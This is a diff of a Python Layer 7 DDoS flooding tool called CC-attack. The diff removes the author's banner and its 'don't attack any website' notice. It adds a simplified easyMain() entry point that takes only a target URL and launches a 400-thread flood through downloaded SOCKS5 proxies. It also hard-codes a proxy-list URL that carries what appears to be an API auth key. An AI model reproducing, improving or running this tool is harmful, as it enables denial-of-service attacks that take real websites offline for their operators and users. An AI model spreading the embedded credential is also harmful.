@@ -1,9 +1,4 @@
 #!/usr/bin/python3
-#Coded by BlueSkyXN
-#########################################
-#         Just a little change          #
-#                           -- BlueSkyXN #
-#########################################
 import requests
 import socket
 import socks
@@ -14,26 +9,6 @@ import sys
 import ssl
 import datetime
 
-print('''
-	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
-	 CC/      CC/       |-----------|/ 
-	 CC/      CC/       |  Layer 7  |/ 
-	 CC/////  CC/////   | ddos tool |/ 
-	  CCCCC/   CCCCC/   |___________|/
->--------------------------------------------->
-Version 3.6 (2020/12/19)
-							C0d3d by BlueSkyXN
-┌─────────────────────────────────────────────┐
-│        Tos: Don't attack ANY website        │
-├─────────────────────────────────────────────┤
-│                 New stuff:                  │
-│          [+] Optimization                   │
-│          [+] Changed Output                 │
-│          [+] Added Url Parser               │
-├─────────────────────────────────────────────┤
-│ Link: https://github.com/BlueSkyXN/CCATK    │
-└─────────────────────────────────────────────┘''')
 
 acceptall = [
     "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,"
@@ -595,8 +570,11 @@ def downloadsocks(choice):
     if choice == "4":
         f = open("socks4.txt", 'wb')
         try:
-            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
+
+            r = requests.get("https://api.proxyscrape.com/v2/account/datacenter_shared/proxy-list?auth=ohexj26x5quhkr73e98u&type=getproxies&country[]=all&protocol=http&format=normal&status=all",
                              timeout=5)
+            # r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&proxytype=socks4&country=anonymous",
+            #                  timeout=5)
             f.write(r.content)
         except:
             pass
@@ -752,7 +730,70 @@ def main():
             time.sleep(0.1)
         except KeyboardInterrupt:
             break
+def easyMain():
+    global multiple
+    global choice
+    global data
+    global mode2
+    global cookies
+    global brute
+    global url
+
+    print("> Mode: [cc/post/head/slow/check]")
+    mode = "cc"  # 默认模式
+
+    url = str(input("> Input the target URL:")).strip()  # 仅保留 URL 输入
+    prevent()
+    ParseUrl(url)
+
+    if mode == "post":
+        mode2 = "n"
+        data = ""
+
+    cookies = ""  # 默认无 Cookies
+
+    choice = "5"  # 默认 SOCKS5
+    socks_type = 5
+
+    if mode == "check":
+        CheckerOption()
+        print("> End of process")
+        return
+
+    thread_num = 400  # 默认线程数 400
+
+    CheckerOption()
+    if len(proxies) == 0:
+        print("> There are no more proxies. Please download a new one.")
+        return
+
+    ind_rlock = threading.RLock()
+
+    if mode == "slow":
+        print("Press Enter to continue.")
+        th = threading.Thread(target=slow, args=(thread_num, socks_type,))
+        th.setDaemon(True)
+        th.start()
+    else:
+        multiple = 100  # 默认放大倍数 100
+        brute = False  # 默认不启用 Boost 模式
+
+        event = threading.Event()
+        print("> Building threads...")
+        SetupIndDict()
+        build_threads(mode, thread_num, event, socks_type, ind_rlock)
+        event.clear()
+        print("Press Enter to continue.")
+        event.set()
+        threading.Thread(target=OutputToScreen, args=(ind_rlock,), daemon=True).start()
+
+    while True:
+        try:
+            time.sleep(0.1)
+        except KeyboardInterrupt:
+            break
 
 
 if __name__ == "__main__":
-    main()  #Coded by BlueSkyXN
+    # main()
+    easyMain()
